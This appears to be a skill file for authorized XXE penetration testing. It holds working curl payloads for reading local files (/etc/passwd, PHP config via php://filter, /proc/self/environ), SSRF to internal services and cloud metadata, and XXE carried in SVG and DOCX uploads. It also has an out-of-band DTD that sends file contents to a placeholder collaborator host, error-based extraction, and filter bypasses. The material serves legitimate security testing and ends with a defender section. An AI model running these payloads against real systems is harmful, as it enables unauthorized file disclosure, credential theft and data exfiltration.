---
name: xxe
description: Use when testing a web application for XML External Entity
  injection on an authorized engagement. Covers finding XML parsers (file
  upload, SOAP, SVG, DOCX, REST with XML bodies), classic in-band file
  disclosure with external entities, SSRF through XXE, blind out-of-band
  exfiltration, error-based extraction, and parameter entity tricks that
  bypass naive filters. Use when any endpoint accepts XML, SVG, Office
  documents, or SAML messages and might resolve external DTDs.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [webapp-pentest-methodology, ssrf, web-sqli]
tools:
  - name: Burp Suite
    version: "2026.2"
  - name: Python
    version: "3.12"
---

XML External Entity injection abuses XML parsers that resolve external
entities, letting an attacker read local files, pivot to internal
services, or exfiltrate data out-of-band. This skill covers the full
authorized methodology: locating XML parsers, classic file reads, SSRF
via XXE, blind and error-based techniques, and XXE hiding inside file
uploads. All testing targets systems you have written permission to
test.

## Quick Workflow

1. Find every endpoint that accepts XML: SOAP services, REST endpoints
   with XML bodies, file uploads (SVG, DOCX, XLSX), SAML logins, and
   document import features.
2. Send a benign XML document with a DOCTYPE to see if the parser
   accepts DTDs at all.
3. Test classic external entity file read (`/etc/passwd`, then
   application files).
4. Test SSRF through the entity URL (internal hosts, metadata address).
5. If nothing reflects, switch to blind out-of-band exfiltration with
   parameter entities.
6. Try error-based extraction when errors echo back but content does
   not.
7. Probe XXE inside SVG uploads, DOCX files, and multipart uploads.
8. Record the payload, parser behavior, and every file or response
   retrieved.

## 1. Finding XML parsers

Anywhere the server parses XML is a candidate. Probe with a harmless
document first.

```bash
# Baseline: does the endpoint accept XML and echo anything back?
curl -s -X POST 'https://target.example/api/user' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><user><name>tester</name></user>' | head -c 400
```

```bash
# DOCTYPE acceptance test: if the parser rejects DOCTYPE outright,
# classic XXE is dead here (but billion-laughs DoS and other parser
# quirks may still apply)
curl -s -X POST 'https://target.example/api/user' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "ok">]><user><name>&x;</name></user>' \
  | grep -o 'ok' | head -1
```

Also test content-type confusion: some endpoints parse XML even when you
send `application/json` or `text/plain`, and some parse the body as XML
regardless of the declared type.

```bash
# Try the XML body with a JSON content type
curl -s -X POST 'https://target.example/api/user' \
  -H 'Content-Type: application/json' \
  -d '<?xml version="1.0"?><user><name>tester</name></user>' | head -c 200
```

## 2. Classic in-band file disclosure

When the parsed value reflects in the response, read files directly.

```bash
# /etc/passwd first: small, always present, proves file read
curl -s -X POST 'https://target.example/api/user' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>' | grep -E 'root:' | head -3
```

```bash
# Windows targets: try the Windows paths
# file:///c:/windows/win.ini
# file:///c:/boot.ini  (older systems)
```

Then walk to high-value files: application config, `/proc/self/environ`
(may leak secrets), and the web root. Read `/etc/hosts` and
`/proc/net/tcp` for network context on Linux targets where the rules of
engagement permit it.

PHP wrappers add power on PHP stacks:

```bash
# php://filter base64-encodes the file so binary and PHP source survive
# transport without breaking the XML
curl -s -X POST 'https://target.example/api/user' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]>
<user><name>&xxe;</name></user>' | grep -o '[A-Za-z0-9+/=]\{100,\}' | head -2
# Pipe the base64 blob through: echo '<blob>' | base64 -d
```

## 3. SSRF through XXE

Point the entity at internal URLs instead of files.

```bash
# Internal service probe via XXE
curl -s -X POST 'https://target.example/api/user' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]>
<user><name>&xxe;</name></user>' | head -c 500
```

```bash
# Cloud metadata via XXE (authorized targets only)
# <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

Combine with the ssrf skill's bypass list when a filter blocks the
obvious URLs: alternate IP encodings and redirect tricks apply to
entity URLs too.

## 4. Blind out-of-band exfiltration

When the response never shows the entity content, exfiltrate with
parameter entities, which can do things regular entities cannot (like
reading a file and sending it out in one DTD).

```bash
# Step 1: host evil.dtd on your server:
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOURID.oastify.com/?x=%file;'>">
# %eval;
# %exfil;
```

```bash
# Step 2: reference the remote DTD from the injection
curl -s -X POST 'https://target.example/api/user' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % pe SYSTEM "https://your-server/evil.dtd"> %pe;]>
<user><name>test</name></user>'
# Step 3: watch the collaborator for a hit containing the file content
```

This works because parameter entities are resolved when the external
DTD is parsed, before the main document is validated. If remote DTDs are
blocked but local file reads work, use the classic local-DTD trick:
reference a DTD file already on the server (for example
`/usr/share/xml/...` on Linux) and redefine one of its entities, which
avoids any outbound connection for the DTD itself while still
exfiltrating to your collaborator.

## 5. Error-based extraction

When errors echo but content does not, make the parser print the file
inside its own error message.

```bash
# Trigger a parse error that includes the file content
curl -s -X POST 'https://target.example/api/user' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % f SYSTEM "file:///etc/passwd">
<!ENTITY % e "<!ENTITY &#x25; xxe SYSTEM '"'"'file:///nonexistent/%f;'"'"'>">
%e; %xxe;
]>
<user><name>test</name></user>' | grep -i -E 'error|exception|nonexistent' | head -5
```

The nonexistent file path now contains the passwd content, and the
parser's "file not found" error prints it. Read the error, decode, and
repeat for the next file.

## 6. XXE in file uploads (SVG, DOCX, SAML)

XML hides inside uploads. Test each upload feature with an XXE-bearing
file.

```bash
# SVG upload: SVG is XML, and many image pipelines parse it
cat > /tmp/xxe.svg <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<text x="10" y="20">&xxe;</text>
</svg>
EOF
curl -s -X POST 'https://target.example/upload' \
  -b 'session=VICTIMSESSION' \
  -F 'avatar=@/tmp/xxe.svg' | head -c 400
```

```bash
# DOCX: unzip, inject XXE into word/document.xml, rezip, upload
mkdir -p /tmp/docx && cd /tmp/docx && unzip -q /tmp/test.docx
# edit word/document.xml to include the DOCTYPE and entity, then:
zip -qr /tmp/xxe.docx *
curl -s -X POST 'https://target.example/upload' \
  -b 'session=VICTIMSESSION' \
  -F 'doc=@/tmp/xxe.docx' | head -c 400
```

SAML responses are XML too: if you can influence the SAMLResponse (test
IdP or a self-registration flow), XXE there can hit the service
provider's parser. XLSX works like DOCX (it is a zip of XML files).

## 7. Filter bypasses

```bash
# The filter blocks the string "ENTITY": some parsers accept lowercase
# or mixed case in HTML-flavored parsers; real XML is case sensitive,
# so instead try:
# - UTF-7 or charset tricks if the parser honors the encoding declaration
# - Parameter entities instead of general entities (different keyword path)
# - External DTD instead of inline DOCTYPE when inline is stripped
# - CDATA sections to smuggle brackets past naive regex filters:
#   <![CDATA[ ... ]]>
```

Test whether the filter runs before or after entity expansion: a filter
that scans the raw input misses entities defined in an external DTD, and
a filter that scans after expansion misses nothing but may break the
application, which tells you where it sits.

## Edge cases

- The parser resolves entities but the application only echoes part of
  the document. Move the entity reference into the echoed field
  (username, comment) rather than a silent one.
- Billion laughs / quadratic blowup DoS: `<!ENTITY a "xxxxxxxxxx">`
  nested expansions can hang the parser. Do NOT test these on
  production; note the parser accepts recursive entities and move on.
- The parser fetches external DTDs but blocks `file://`. You still have
  SSRF and blind exfiltration; pivot to those.
- libxml2, Xerces, .NET, and PHP parsers differ in what they allow
  (parameter entities in internal subsets, XInclude). Fingerprint the
  stack from error messages, then match the technique to the parser.
- XInclude (`<xi:include href="file:///etc/passwd" parse="text"/>`) is
  a separate code path that is sometimes enabled when entities are
  disabled. Test it explicitly.
- The application validates against an XSD schema first: schema
  validation does not stop entity resolution, so XXE often survives it.

## Escalation

- In-band read works but is truncated: read files in chunks with
  `php://filter` plus string offsets, or exfiltrate blind instead.
- No file scheme: pivot fully to SSRF and metadata, and to XInclude
  over HTTP.
- Remote DTD blocked: use the local-DTD redefinition trick or
  error-based extraction, neither needs an outbound DTD fetch.
- Everything blind and no egress: fall back to timing (entities that
  trigger slow external fetches) to at least prove the parser resolves
  externals, and report it as blind XXE with limited impact.
- Upload-only XXE with no reflection: check whether the parsed SVG is
  served back to you (avatar URL) or rendered into a PDF; the render
  step is often where the entity content appears.

## Detection and defender view

Defenders see XXE as DOCTYPE declarations and ENTITY keywords arriving
in XML input, outbound connections from the app server to internal
addresses or collaborator domains during XML processing, and file reads
outside the web root in audit logs. The durable fix is to disable DTDs
and external entities in every XML parser (the exact flag varies by
language: `XMLConstants.FEATURE_SECURE_PROCESSING` plus disallowing
DOCTYPE in Java, `libxml_disable_entity_loader` era settings in PHP,
`XmlReader` with `DtdProcessing.Prohibit` in .NET, defusedxml in
Python). For uploads, re-encode images instead of parsing uploads as
XML where possible. Log rejected DOCTYPEs; a burst of them is active
probing.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): the parser
  entry point.
- MITRE ATT&CK T1552.005 (Unsecured Credentials: Cloud Instance
  Metadata API): metadata theft via XXE-SSRF.
- CWE-611 (Improper Restriction of XML External Entity Reference).
- CWE-776 (Improper Restriction of Recursive Entity References in
  DTDs): billion laughs.
- CWE-918 (Server-Side Request Forgery): XXE-driven SSRF.
- OWASP Testing Guide: Testing for XML Injection (OTG-INPVAL-008).
- OWASP XXE Prevention Cheat Sheet.
- PortSwigger Web Security Academy: XXE labs and cheat sheet.
